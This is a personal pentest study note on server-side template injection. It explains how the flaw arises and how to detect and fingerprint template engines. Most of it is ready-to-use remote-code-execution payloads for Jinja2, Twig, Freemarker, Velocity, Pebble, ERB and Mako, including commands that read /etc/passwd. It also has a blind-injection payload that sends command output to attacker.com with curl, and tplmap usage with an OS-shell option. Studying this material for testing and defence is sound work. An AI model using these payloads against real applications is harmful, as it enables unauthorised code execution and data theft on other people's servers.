# SSTI — Server-Side Template Injection

← [[A03-Injection]]

---

SSTI is when user input is embedded directly into a server-side template and the template engine evaluates it as code. It almost always leads to RCE.

---

## The Core Idea

Template engines let developers embed dynamic expressions in HTML:

```python
# Jinja2 (Python/Flask)
template = "Hello {{ name }}!"
render(template, name=user_input)
```

If instead the template itself is built from user input:

```python
# Vulnerable
template = "Hello " + user_input + "!"
render(template)
```

...then an attacker can inject template syntax and execute arbitrary code.

---

## Detection

Send template expression syntax. If the app evaluates it rather than displaying it literally, SSTI is present.

```
{{7*7}}       → 49?     ← Jinja2, Twig
${7*7}        → 49?     ← Freemarker, Velocity
#{7*7}        → 49?     ← Pebble
<%= 7*7 %>    → 49?     ← ERB (Ruby)
${7*7}        → 49?     ← Mako, Thymeleaf
*{7*7}        → 49?     ← Thymeleaf (Spring)
```

---

## Identifying the Template Engine

Different engines produce different results from the same payload.

```
{{7*'7'}}
→ 49     : Jinja2 (Python)
→ 7777777: Twig (PHP)
→ error  : something else
```

Detection flow:

```
Input: {{7*7}}
  → 49? → Could be Jinja2 or Twig
    → {{7*'7'}} → 49? → Jinja2
    → {{7*'7'}} → 7777777? → Twig
  → ${7*7} → 49? → Freemarker / Velocity / Mako
  → <%= 7*7 %> → 49? → ERB
  → error/no change → try other syntax
```

---

## RCE Payloads by Template Engine

### Jinja2 (Python/Flask/Django)

```python
# Basic RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}  ← list all subclasses

# Find subprocess.Popen index (varies by Python version, ~258-400 range)
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}

# Cleaner via config object (Flask)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Lipsum shortcut
{{ lipsum.__globals__.os.popen('id').read() }}

# Read file
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0] }}
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Or
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

// Twig 1.x
{{ "/etc/passwd"|file_excerpt(1,30) }}
```

### Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// Or
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Pebble (Java)

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance([bytes]) }}
```

### ERB (Ruby on Rails)

```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').readlines() %>
```

### Mako (Python)

```python
${__import__('os').popen('id').read()}
<%
import os
x=os.popen('id').read()
%>
${x}
```

---

## Blind SSTI

No output in response? Use out-of-band:

```python
# Jinja2 — curl to your server with command output
{{ ''.__class__.__mro__[1].__subclasses__()[396]('curl http://attacker.com/?x=$(id)',shell=True) }}

# Or time-based confirmation
{{ ''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True) }}
```

---

## Where to Find SSTI

- Profile fields (name, bio, custom messages)
- Email templates ("Hi {{name}}, your order...")
- Error messages that reflect URL or parameter values
- Custom report generation
- Any "preview" feature

---

## Using tplmap (Automated)

```bash
# tplmap — automated SSTI detection and exploitation
python3 tplmap.py -u "https://example.com/page?name=test"
python3 tplmap.py -u "https://example.com/page?name=test" --os-shell
```

---

*Related: [[A03-Injection]] | [[XSS-Overview]]*

*Sources: PortSwigger Web Security Academy, PayloadsAllTheThings, HackTricks*
